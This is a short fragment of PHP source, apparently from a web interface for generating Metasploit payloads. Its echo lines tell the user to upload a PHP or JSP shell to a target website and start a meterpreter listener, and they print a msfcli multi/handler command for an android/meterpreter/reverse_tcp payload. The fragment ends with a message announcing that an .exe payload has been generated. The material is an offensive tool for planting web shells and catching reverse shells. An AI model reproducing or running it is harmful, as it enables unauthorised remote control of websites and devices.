...
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b> Upload this shell on target website supporting PHP and start meterpreter listener ';
echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
...
echo '<b>Note:</b> Upload this shell on target website supporting JSP and start meterpreter listener ';
...
echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli multi/handler PAYLOAD=android/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
     ...
     echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : '".$pkg. ".exe Generated Successfully ! refer to the results tab'});</script>";
